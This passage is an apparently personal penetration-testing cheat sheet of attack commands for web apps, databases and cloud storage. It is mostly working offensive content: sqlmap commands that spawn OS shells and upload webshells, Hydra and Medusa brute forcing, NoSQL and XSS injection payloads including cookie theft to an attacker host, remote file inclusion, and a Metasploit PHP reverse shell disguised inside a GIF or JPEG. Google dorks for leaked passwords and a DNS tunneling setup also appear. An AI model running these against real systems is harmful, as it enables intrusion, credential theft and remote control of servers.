sqlmap -u http://$Domain/ovidentia/index.php\?tg\=delegat\&idx\=mem\&id\=1 --cookie "Cookie: OV1364928461=6kb5jvu7f6lg93qlo3vl9111f8" --random-agent --risk 3 --level 5 --dbms=mysql -p id --dbs


##-=====================================-##
##   [+] SQLMap - Checking Privileges
##-=====================================-##
sqlmap -u http://localhost/Less-1/?id=1 --privileges | grep FILE


##-===============================-##
##   [+] SQLMap - Reading file
##-===============================-##
sqlmap -u $URL --file-read=$File

sqlmap -u http://localhost/Less-1/?id=1 --file-read=/etc/passwd


##-===============================-##
##   [+] SQLMap - Writing file
##-===============================-##
sqlmap -u $URL --file-write=$File --file-dest=$Path

sqlmap -u http://localhost/Less-1/?id=1 --file-write=shell.php --file-dest=/var/www/html/shell-php.php



##-=======================-##
##   [+] SQLMap - Post
##-=======================-##
sqlmap -u $URL --data="<POST-paramters> "

sqlmap -u http://localhost/Less-11/ --data "uname=teste&passwd=&submit=Submit" -p uname


##-==============================================-##
##   [+] SQLMap - use a file for post request:
##-==============================================-##
sqlmap  -r post-request.txt -p uname


##-==============================================-##
##   [+] SQLMap - 
##-==============================================-##
sqlmap -u http://$Domain --crawl 3 --dbs --answer="redirect=Y" --batch 



## --------------------------------------------------------------------------------------- ##
##   [?] sqlmap - post-request - captured request via Burp Proxy via Save Item to File
## --------------------------------------------------------------------------------------- ##
sqlmap -r post-request -p item --level=5 --risk=3 --dbms=mysql --os-shell --threads 10




sqlmap.py -u '$URL' --random-agent --dbms=MSSQL --level=3 --risk=3 -b --passwords --crawl=10 --forms
------------------------------------------------------------------------------------------------------

Use Burp to trap a request. Copy the request to /root/tmp.

sqlmap.py -r /root/tmp --banner                                              Show webserver OS, apps and db
sqlmap.py -r /root/tmp --dbms=<db type> --dbs                                Show all dbs available
sqlmap.py -r /root/tmp --dbms=<db type> -p <parameter> --current-user        Show the user the web server is using to talk to the db
sqlmap.py -r /root/tmp --dbms=<db type> -p <parameter> -U <user> --passwords
sqlmap.py -r /root/tmp --dbms=<db type> -D <database> --tables               Show all tables in a db
sqlmap.py -r /root/tmp --dbms=<db type> -D <database> -T <table> --columns   Show all columns in a table
sqlmap.py -r /root/tmp --dbms=<db type> -D <database> -T <table> --dump      Show all data in a table     

Example
sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#'
--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee"

sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#' 
--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" --dbs

sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#' 
--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" -D dvwa --tables

sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#'
--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" -D dvwa -T users --columns

sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#' 
--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" -D dvwa -T users -C user_id,user,password --dump

sqlmap.py -u 'http://target.com/login.asp' --data="txtLoginID=shrikant&txtPassword=password&cmdSubmit=Login" --os-shell




##-===================================-##
##   [+] SQLMap - Upload Webshell:
##-===================================-##
python sqlmap.py -u 'address' --os-shell
## Find current path (generating php error)
## e.g. Warning: ... boolean given in /var/www/classes/post.php ....







sqlmap -u 'http://$Domain.com/anyfile.asp?id_test=8%20or%207250%




Scuba

• MSSQL DataMask
• SQLRECON




##-=========================================-##
##   [+] Medusa - Bruteforce basic_auth:
##-=========================================-##
medusa -h $IP -U ../creds/usernames.txt -P ../creds/passwords.txt -M http -m DIR:/printers -T 10



##-======================================================-##
##   [+] Patator - http_fuzz Module - Brute-force HTTP
##-======================================================-##
patator http_fuzz url=http://$line/phpmyadmin/index.php method=POST body='pma_username=root&pma_password=FILE0&server=1&target=index.php&lang=en&token=' 0=$PASSWORD before_urls=http://$line/phpmyadmin/index.php accept_cookie=1 follow=1 -x ignore:fgrep='Cannot log in to the MySQL server' -l /tmp/qsdf

patator http_fuzz url=http://$line/pma/index.php method=POST body='pma_username=COMBO00&pma_password=COMBO01&server=1&target=index.php&lang=en&token=' 0=$arg2 before_urls=http://$line/pma/index.php accept_cookie=1 follow=1 -x ignore:fgrep='Cannot log in to the MySQL server' -l /tmp/qsdf




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   [+] phpMyAdmin - Web Server + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


## ------------------------------------------ ##
##    [?] phpMyAdmin - Web Server - 
## ------------------------------------------ ##


##-===============================================-##
##   [+] THC-Hydra - Brute Force - phpMyAdmin:
##-===============================================-##
hydra -l root -P /$Dir/$File.txt -e n http-post-form://$IP -m "/phpMyAdmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1:S=information_schema"


##-=======================================================-##
##   [+] THC-Hydra - Brute Force - GET or POST Request 
##-=======================================================-##
hydra -I -V -F -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login.php:username=admin&password=^PASS^:Invalid Password:H=Cookie: PHPSESSID=cd892e2HNW3N" -t 64



hardening-php-through-php-ini-configuration-file
php.ini 


display_errors = Off
log_errors = On
allow_url_fopen = Off
safe_mode = On
expose_php = Off
enable_dl = Off
disable_functions = system, show_source, symlink, exec, dl, shell_exec, passthru, phpinfo, escapeshellarg, escapeshellcmd






##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Tomcat - Web Server + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


## -------------------------------------- ##
##    [?] Tomcat Web Server - 
## -------------------------------------- ##





use auxiliary/scanner/http/tomcat_enum			 
set RHOSTS $IP
set RPORT 8080
run


use auxiliary/scanner/http/http_version			
set RHOSTS $IP
set RPORT 8080
run



use auxiliary/scanner/http/tomcat_mgr_login
set USERNAME tomcat
set USERPASS_FILE /$Dir/$Pass.txt
set STOP_ON_SUCCESS true
set RHOSTS $IP
set RPORT 8080
run



use exploit/multi/http/tomcat_mgr_upload
set USERNAME tomcat
set PASSWORD tomcat
set RHOST $IP
set RPORT 8080
set PATH /manager/html
set PAYLOAD java/meterpreter/bind_tcp
exploit 



##-====================================================-##
##   [+] THC-Hydra - Brute Force - Tomcat Web Server
##-====================================================-##
hydra -l tomcat -P list.txt -e ns -s 8080 -vV $IP http-get /manager/html




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Oracle - Database + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



## -------------------------------------- ##
##    [?] Oracle Database - Port 1521
## -------------------------------------- ##


tnscmd10g version -h $IP
tnscmd10g status -h $IP



## --------------------------------------------------- ##
##    [?] Oracle Database - Padding Oracle Attacks:
## --------------------------------------------------- ##
## 
##-============================================================================-##
##   [+] Padbuster - Automated Padding Attack Tool - Oracle DB Attack Tool
##-============================================================================-##
## ---------------------------------------------------------------------------- ##
##   [?] url             || first argument is the URL
##   [?] encrypted       || second argument is the encrypted text
##   [?] bits            || third argument is the number of bits per block
##   [?] -cookies        || define a cookie to use
##   [?] -plaintext      || plaintext to encrypt
## ----------------------------------------------------------------------------- ##
padBuster.pl http://$TARGET "ENC-COOKIE-TEXT" 8 -cookies "ENC-COOKIE" -plaintext '{"user":"admin","role":"admin"}'





##-=================================-##
##   [+] Scan An Oracle Database:
##-=================================-##
oscanner -s $IP -P 1521


## ------------------------------------------ ##
##    [?] Oracle TNS Listener: 1521-1527
##    [?] Oracle XDB: 2100
## ------------------------------------------ ##


##-==================================-##
##   [+] NMap - Scan Oracle Ports:
##-==================================-##
nmap -sV --open -p7001,8001,9001,7777,16000,8890,8888,8891,8891,1521,6016,14501,14502,6080,8080,5556,1527,9556,9556,8989,80,443,8002,4889,4898,1626,9000,10200,10300,8000,4443,11000,6100,6200,6500,9999,12345,7401,7201,7601,7801,6801,8889,1559,4899,7101,7101,7401-7500 -iL ipx



## ------------------------------------------------------------------------------------ ##
##    [?] /usr/share/metasploit-framework/data/wordlists/oracle_default_passwords.csv
## ------------------------------------------------------------------------------------ ##


## ----------------------------------------------------------------------------- ##
      nmap –script=oracle-sid-brute -p 1521-1900 $IP
## ----------------------------------------------------------------------------- ##
      nmap –script=oracle-sid-brute –script-args=oraclesids=/path/sidfile -p 1521-1800 $Hostname
      nmap -p1521 –script oracle-brute –script-args oracle-brute.sid=DB11G $IP
## ----------------------------------------------------------------------------- ##
      nmap -sV –script oracle-brute –script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt $IP
      nmap -sV –script oracle-brute –script-args userdb=/$Dir/$Users.txt,passdb=/$Dir/$Pass.txt $IP
## ----------------------------------------------------------------------------- ##
      nmap -sV –script oracle-brute –script-args brute.firstOnly $IP
      nmap -sV –script oracle-brute –script-args unpwdb.timelimit=0 $IP 
      nmap -sV –script oracle-brute –script-args unpwdb.timelimit=60m $IP
## ----------------------------------------------------------------------------- ##
      nmap –script oracle-brute –script-args brute.mode=user $IP
      nmap –script oracle-brute –script-args brute.mode=pass $IP
## ----------------------------------------------------------------------------- ##


##-==========================================-##
##   [+] Metasploit - file upload exploit:
##-==========================================-##
use exploit/windows/oracle/client_system_analyzer_upload
set RHOST xxxxx
exploit 





###############################################################
./odat.py all -s 192.168.1.254 -p 1521

You can give the SID if you know it:
./odat.py all -s 192.168.1.254 -p 1521 -d ORCL

If you know a valid account, you can give it to this module:
./odat.py all -s 192.168.1.254 -p 1521 -d ORCL -U SYS -P password

See all for more details about this module.
./odat.py all -s 192.168.1.254 -vvv

find valid accounts on sid :
./odat.py all -s <ip> -p 1521 -d CLRExtProc --accounts-file=accounts/accounts.txt
./odat.py all -s  <ip> -p 1521 -d CLRExtProc --accounts-file accounts/accounts_multiple.txt
./odat.py passwordguesser -s <ip> -p 1521 -d CLRExtProc --accounts-file accounts/accounts_multiple.txt





##-==========================================-##
##   [+] Oracle - Check Version : 
##-==========================================-##
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'; 
SELECT banner FROM v$version WHERE banner LIKE 'TNS%';
SELECT version FROM v$instance;


##-==========================================-##
##   [+] Oracle - Current User :
##-==========================================-##
SELECT user FROM dual;


##-==========================================-##
##   [+] Oracle - List Users:
##-==========================================-##
SELECT username FROM all_users ORDER BY username;
SELECT name FROM sys.user$;
SELECT name, password from sys.user$;
SELECT name, spare4 from sys.user$;
select username,account_status,created,profile FROM sys.dba_users ORDER BY username;


##-==========================================-##
##   [+] Oracle - List Password Hashes：
##-==========================================-##
SELECT name, password, astatus FROM sys.user$;  
SELECT name,spare4 FROM sys.user$ where rownum <= 10; 


##-==========================================-##
##   [+] Oracle - Current Database:
##-==========================================-##
SELECT global_name FROM global_name;
SELECT name FROM v database; 
SELECT instance_name FROM v$instance;
SELECT SYS.DATABASE_NAME FROM DUAL;


##-==========================================-##
##   [+] Oracle - List Databases：
##-==========================================-##
SELECT DISTINCT owner FROM all_tables;


##-==========================================-##
##   [+] Oracle - List DBA Accounts:
##-==========================================-##
SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = 'YES';


##-==========================================-##
##   [+] Oracle - List Columns :
##-==========================================-##
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';


##-==========================================-##
##   [+] Oracle - Tables:
##-==========================================-##
SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables;


##-==========================================-##
##   [+] Oracle - Tables From Column Name	 :
##-==========================================-##
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';


##-==========================================-##
##   [+] Oracle - Privileges :
##-==========================================-##
SELECT * FROM session_privs;(Retrieves Current Privs)
SELECT * FROM dba_sys_privs WHERE grantee = 'DBSNMP';
SELECT grantee FROM dba_sys_privs WHERE privilege = 'SELECT ANY DICTIONARY';
SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;


##-==========================================-##
##   [+] Oracle - Location of DB Files:
##-==========================================-##
SELECT name FROM V$DATAFILE;


## --------------------------------------------------- ##
##   [?] First create a normal user and authorize:
## --------------------------------------------------- ##
##   [?] create user yang identified by yang;  
##   [?] grant connect, resource to yang; 
## --------------------------------------------------- ##


##-==========================================-##
##   [+] Oracle - Make DNS Requests：
##-==========================================-##
SELECT UTL_INADDR.get_host_address('www.baidu.com') FROM dual; 
SELECT UTL_HTTP.REQUEST('http://www.baidu.com/') FROM dual;


##-==========================================-##
##   [+] Oracle - Local File Access：
##-==========================================-##
SELECT value FROM v$parameter2 WHERE name = '/etc/passwd'; 


##-==========================================-##
##   [+] Oracle - Hostname, IP Address：
##-==========================================-##
SELECT host_name FROM v$instance; 
SELECT UTL_INADDR.get_host_name('192.168.1.103') FROM dual; 


##-======================================================================-##
##   [+] Oracle - John the Ripper - Brute Force Oracle Password Hash:
##-======================================================================-##
## ---------------------------------------------------------------------------- ##
##   [?] DBSNMP:BA054BE9241074F8437B47B98B9298F6063561403341EA94F595D242183E
## ---------------------------------------------------------------------------- ##
john --format=oracle11 /tmp/orahash.txt






##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] MongoDB - Database Exploitation + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


##-==========================================-##
##   [+] NMap - MongoDB - NSE Scripts:
##-==========================================-##
nmap -Pn -n --open -p27017 --script=mongodb-databases,mongodb-info 10.0.0.0/24



##-===================================================-##
##    [?] NoSQLMap - MongoDB - Database Injection
##-===================================================-##
## --------------------------------------------------- ##
##        <?> https://github.com/codingo/NoSQLMap
## --------------------------------------------------- ##


##-========================================-##
##    [?] NoSQLMap - Injection Examples:
##-========================================-##
## 
##\_____________________________________________________________________________/##
## ----------------------------------------------------------------------------- ##
##-=============================================================================-##

true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
';sleep(5000);
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);

##\_____________________________________________________________________________/##
## ----------------------------------------------------------------------------- ##
##-=============================================================================-##


##-==============================-##
##   [+] MongoDB - Mongo shell
##-==============================-##
## 
## ------------------------------------------------- ##
     show dbs                ## List databases
## ------------------------------------------------- ##
     use $File               ## Use a database
## ------------------------------------------------- ##
     show collections        ## List collections
## ------------------------------------------------- ##

 

##-============================-##
##   [+] Backup a database
##-============================-##
mongodump --db $File --out /$Dir/
```

##-============================-##
##   [+] Restore a database
##-============================-##
mongorestore /$Dir/



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] XSS - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



## ------------------------------------ ##
##    [?] Cross Site Scripting (XSS)
## ------------------------------------ ##





## ------------------------------------------------------------------------- ##
##   [?] XsSScan - Traverse websites and subdomains to find links, then
##   [?]           Search for Cross Site Scripting (XSS) Vulnerabilities
## ------------------------------------------------------------------------- ##


XsSCan.py -u $Domain 


##-======================================-##
##   [+] XsSScan - Comprehensive Scan:
##-======================================-##
XsSCan.py -u $Domain -e 


##-====================================-##
##   [+] XsSScan - Verbose Logging:
##-====================================-##
XsSCan.py -u $Domain -v


##-======================================-##
##   [+] XsSScan - Cookies
##-======================================-##
XsSCan.py -u $Domain.complex -c name=$Name name=$Name





xsscapy

## ------------------------------------------------ ##
##   [?] Cross-Site Request Forgery (XSRF/CSRF)
## ------------------------------------------------ ##




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   [+] Cross-Site Request Forgery (XSRF/CSRF) - Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


## ------------------------------------------------ ##
##   [?] Cross-Site Request Forgery (XSRF/CSRF)
## ------------------------------------------------ ##


## ----------------------------------------------- ##
##    [?] Server side Request Forgery (SSRF)
## ----------------------------------------------- ##


## ---------------------------------------------------------------------- ##
##    [?] Server side Request Forgery (SSRF) - Exploiting URL Parser
## ---------------------------------------------------------------------- ##


## ----------------------------------------------------------------------------- ##
##    [?] SSRF - Sometimes what appears to be RFI can lead to SSRF (example):
## ----------------------------------------------------------------------------- ##


##-=============================================================-##
##   [+] WFuzz - Port scan the internal resources available:
##-=============================================================-##
wfuzz -c -z range,1-65535 --filter "l>2" http://$TARGET/proxy.php?path=localhost:FUZZ


## ------------------------------------------------- ##
##    [?] WFuzz - If you find one - dirbust it:
## ------------------------------------------------- ##
wfuzz -c -w /usr/share/wordlists/dirb/big.txt --filter "l>11" http://$TARGET:8080/FUZZ


##-==========================================================-##
##     [+] SSRF - use Authorize Extension Match and replace
##-==========================================================-##
https?://(www.)?[-a-zA-Z0–9@:%.+~#=]{1,256}.[a-zA-Z0–9()]{1,6}\b([-a-zA-Z0–9()@:%+.~#?&//=]*)



## ------------------------------------------------ ##
##   [?] DOM - 
## ------------------------------------------------ ##


## -------------------------------- ##
##    [?] XSS - DOM Clobbering
## -------------------------------- ##



## ----------------------------------------------- ##
##    [?] XML External Entity (XXE) - 
## ----------------------------------------------- ##

## ----------------------------------------------- ##
##    [?] XML External Entity (XXE) - Injection
## ----------------------------------------------- ##

XML External Entity (XXE) - Injection



HTTP Header Injection - 

Arbitrary Redirection - 

OS Command Injection - 

Path Traversal - 

Script Injection - 

SMTP Injection - 

Integer bugs - 

LDAP Injection - 

XPath Injection - 

SSRF Redirect - 

SharePoint RCE: Look for CVE-2020-0646 SharePoint RCE related endpoint.

API Endpoints: Find WSDL files.

CT Logs: Certificate Transparency (CT)

Subdomain Scraping form JS files & Source code

Permutations/Alterations

S3 Bucket
Zone Transfer
Change POST body encoding with Burp
PUT method all directories
dirsearch with cookie once authenticated
LFI, RFI, SQL, RCE, XXE, SSRF injections
php.ini config misconfigurations






Virtual Hosting Misconfigurations


##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] VirtualBox - Virtualization Client - VDI + VHD
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


##-======================================-##
##   [+] VBoxManage - Create a new VM
##-======================================-##
VBoxManage.exe createvm --name $VMName --ostype "Ubuntu" --register


##-=====================================================-##
##   [+] VBoxManage - Add a network card In NAT Mode
##-=====================================================-##
VBoxManage.exe modifyvm $VMName --ioapic on  # required for 64bit
VBoxManage.exe modifyvm $VMName --memory 1024 --vram 128
VBoxManage.exe modifyvm $VMName --nic1 nat
VBoxManage.exe modifyvm $VMName --audio none
VBoxManage.exe modifyvm $VMName --graphicscontroller vmsvga
VBoxManage.exe modifyvm $VMName --description "Shadowbunny"

##-========================================-##
##   [+] VBoxManage - Mount the VHD file
##-========================================-##
VBoxManage.exe storagectl $VMName -name "SATA Controller" -add sata
VBoxManage.exe storageattach $VMName -comment "Shadowbunny Disk" -storagectl "SATA Controller" -type hdd -medium "$env:USERPROFILE\VirtualBox VMs\IT Recovery\shadowbunny.vhd" -port 0

##-==================================-##
##   [+] VBoxManage - Start the VM
##-==================================-##
VBoxManage.exe startvm $VMName –type headless 


##-=========================================-##
##    [+] VBoxManage - Add Shared Folder
##-=========================================-##
## --------------------------------------------- ##
##   [?] Require: VirtualBox Guest Additions
## --------------------------------------------- ##
VBoxManage.exe sharedfolder add $VMName -name shadow_c -hostpath c:\ -automount


##-=====================================-##
##    [+] Mount the folder in the VM
##-=====================================-##
sudo mkdir /mnt/c
sudo mount -t vboxsf shadow_c /mnt/c








Frame Injection - 






Xssed.com
/r/xss
xss.cx
xssposed.org






xsstracer $Domain 80


xsser -u http://$Domain -c10 --Cw=200 --auto --save --follow-redirects



curl http://target.com/login.php?user=`perl –e 'print "a" x 500'`


Stored - example: guestbook
<script>alert("XSS");</script>
<script>alert(document.cookie);</script>
<iframe SRC="http://attackerIP" height="0" width="0"></iframe>
<script>new Image().src="http://attakerIP/test.php?output="+document.cookie;</script>


##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Remote File Inclusion (RFI) - Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


## ------------------------------------- ##
##   [?] Local File Inclusion (LFI)
## ------------------------------------- ##


## -------------------------------------------------------- ##
##   [?] Local File Inclusion Testing Techniques:
## -------------------------------------------------------- ##
##        <?> https://www.exploit-db.com/docs/40992.pdf
## -------------------------------------------------------- ##

## ------------------------------------------------ ##
##   [?] Local File Inclusion (LFI) - Examples:
## ------------------------------------------------ ##

file:///etc/passwd
../../../etc/passwd
php://filter/convert.base64-encode/resource=admin.php
php://filter/convert.base64-encode/resource=../../../../../etc/passwd
php://input
    send post data
expect://whoami



## ------------------------------------- ##
##   [?] Remote File Inclusion (RFI)
## ------------------------------------- ##




## ------------------------------------------- ##
##   [?] Check php config options for RFI:
## ------------------------------------------- ##


## -------------------------------------------------------- ##
##   [?] PHP Config RFI Misconfiguration Vulnerability:
## -------------------------------------------------------- ##
allow_url_fopen=on
allow_url_include=on






## ------------------------------------- ##
##   [?] Remote Code Execution (RCE)
## ------------------------------------- ##


## ---------------------------------------------------------------- ##
##   [?] Server Side Template Injection - 
## ---------------------------------------------------------------- ##
##       <?> Essentially [Remote Code Execution] (RCE)
## ---------------------------------------------------------------- ##


## ---------------------------------------------------------------- ##
##   [?] Open URL Redirects



http://$TargetIP/index.php?page=http://$AttackerIP/evil.txt




fimap -u "http://INSERTIPADDRESS/example.php?test="


# Ordered output
curl -s http://INSERTIPADDRESS/gallery.php?page=/etc/passwd
/root/Tools/Kadimus/kadimus -u http://INSERTIPADDRESS/example.php?page=





Use Burp to intercept and modify values to test for LFI/RFI:














## ----------------------------------- ##
##   [?] Cross-Site Tracing (XST)
## ----------------------------------- ##



##-====================================================-##
##   [+] Curl - Check for Cross-Site Tracing (XST)
##-====================================================-##
curl -X TRACE $IP
curl -X TRACE -H "Cookie: name=value" $Domain


## ---------------------------------------------------------------- ##
##   [?] Insecure Direct Object Reference - 
## ---------------------------------------------------------------- ##
##       <?> A direct object reference occurs when a developer exposes a reference 
##       <?> to an internal implementation object such as a file, directory, or database key. 
## ---------------------------------------------------------------- ##





##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Cloud - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


awsbucketdump
AWSBucketDump.py -l $File.txt
AWSBucketDump.py -D -l BucketNames.txt -g s.txt



php s3-buckets-bruteforcer.php --bucket gwen001-test002




s3Scanner - find open S3 buckets and dump their contents

Multi-threaded scanning
S3-compatible APIs

s3scanner.py --include-closed --out-file $File.txt --dump $File.txt





## ---------------------------------------------- ##
##   [?] CloudBrute - Awesome Cloud Enumerator
## ---------------------------------------------- ##
cloudbrute --domain $Domain

cloudbrute --mode storage           ## storage or app. Default: storage
cloudbrute --mode app

cloudbrute --output $File.txt       ## Output file
cloudbrute --proxy $File.txt        ## use proxy list
cloudbrute --randomagent            ## user agent randomization
cloudbrute --debug                  ## show debug logs
cloudbrute --keyword $Syntax        ## keyword used to generator urls
cloudbrute --wordlist $File         ## path to wordlist



##-==========================================================-##
##   [+] Cloud_Enum - Enumerate S3 Buckets In Public Clouds
##-==========================================================-##
cloud_enum --keyword $Keyword 
cloud_enum --keyfile $KeyFile 
cloud_enum --brute /usr/lib/cloud-enum/enum_tools/fuzz.txt 
cloud_enum --nameserver $DNS 
cloud_enum --logfile /var/log/$File 
cloud_enum --format text 
cloud_enum --format json 
cloud_enum --format csv 





CloudScraper.py -u $Domain




##-===========================================================-##
##   [+] ScoutSuite - Multi-Cloud Security Assessment Tool
##-===========================================================-##


python scout.py aws --access-keys --access-key-id $KeyID --secret-access-key $SecretAccessKey --session-token $Token


source scoutsuite/bin/activate


scout aws --profile $Profile --no-browser --report-dir /tmp/scout-report


scout azure --cli --report-dir $Dir/





AzureAudit.py:

python cs.py -env azure






prowler aws --profile custom-profile -M csv json html


prowler $Provider --list-checks

prowler $Provider --list-services




##-==========================================-##
##   [+] Pacu - AWS Exploitation Framework
##-==========================================-##

python3 pacu.py

TestSession

set_keys
import_keys --all ~/.aws/credentials

Key alias: 
Access key ID: 
Secret access key: 
Session token: 

update_regions

run 
exec 

s3_finder
enum_ec2
acm_enum
iam_enum_users
iam_enum_roles
vpc_enum_lateral_movement

s3_download_bucket








##-=========================-##
##   [+] AWS Buckets Dorks
##-=========================-##
site:*.s3.amazonaws.com ext:xls | ext:xlsx | ext:csv password|passwd|pass user|username|uid|email
site:*.amazonaws.com -www "compute"
site:*.amazonaws.com -www "compute" "ap-south-1"
site:pastebin.com "rds.amazonaws.com" "u " pass OR password




aws sts get-caller-identity
aws s3 ls
aws s3 ls s3://bucket.com
aws s3 ls --recursive s3://bucket.com
aws iam get-account-password-policy
aws sts get-session-token



athenaquery="SELECT * FROM rapid7_fdns_any WHERE name LIKE '%."$scope"' AND date = (SELECT MAX(date) from rapid7_fdns_any)"

queryid=$(aws athena start-query-execution --query-string "$athenaquery" --query-execution-context Database=default --result-configuration OutputLocation=s3://your-athena-results-bucket-here/ --output text

aws athena get-query-execution --query-execution-id "$queryid" --output json

aws athena get-query-results --query-execution-id "$queryid" --output json




##-==============================================-##
##   [+] AWS - Penetration Testing S3 Buckets:
##-==============================================-##






##-==================================================================-##
##   [+] AWS - File Upload Attack - Metasploit - Backdooring GIFs:
##-==================================================================-##


## ------------------------------------------------------- ##
##   [?] As a note, try to overwrite the magic bytes 
##       of your backdoor with a valid image
##       so that the check will validate. 
## ------------------------------------------------------- ##
##   [?] This includes Content-Type.
## ------------------------------------------------------- ##

msfvenom --list | grep php
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.15.237 LPORT=54321 -o evil.php
echo “FFD8FFEo” | xxd -r -p > evil.gif
cat evil.php >> evil.gif



##-============================================-##
##   [+] Exiftool - Injecting PHP into JPEG
##-============================================-##
exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
exiftool “-comment<=back.php” back.png



##-====================================-##
##   [+] Curl - Upload PHP Backdoor
##-====================================-##
curl -X POST -F "field1=test" -F "file=@/home/user/evil.gif" http://$TARGET/upload.php --cookie "cookie"






## --------------------------------------------- ##
##   [?] DNSCat - Pentesting - DNS Tunneling
## --------------------------------------------- ##



dnscat2.rb 
dnscat2> New session established: 1422 
dnscat2> session -i 1422


## ------------------------- ##
##   [?] Target Machine:
## ------------------------- ##
dnscat --host $ServerIP



##-==================================-##
##   [+] Start the dnscat2 Server
##-==================================-##
dnscat2.rb --security=authenticated --secret=12viFdfMonso3dF $Domain



##-=================================-##
##   [+] Start the dnscat2 Client
##-=================================-##
dnscat --retransmit-forever --secret=12viFdfMonso3dF $Domain







## ----------------------------------------------- ##
##  [+] Use Grep and regex to output to a file
## ----------------------------------------------- ##
cat index.html | grep -o 'http://\[^"\]\*' | cut -d "/" -f 3 | sort –u > list.txt



## ----------------------------------------------------- ##
##   [?] Use bash loop to find IP behind each host
## ----------------------------------------------------- ##
for url in $(cat list.txt); do host $Domain; done



## -------------------------------------- ##
##   [?] DNS Zone Transfer - Bash Loop
## -------------------------------------- ##
for x in $(host -t ns $Domain | cut -d ' ' -f4); do
     host -l $Domain $x
done



## ------------------------------------------------ ##
##   [?] DNS Subdomain - IP Address Enumeration
## ------------------------------------------------ ##
for x in $(cat /usr/share/dnsenum/dns.txt); do
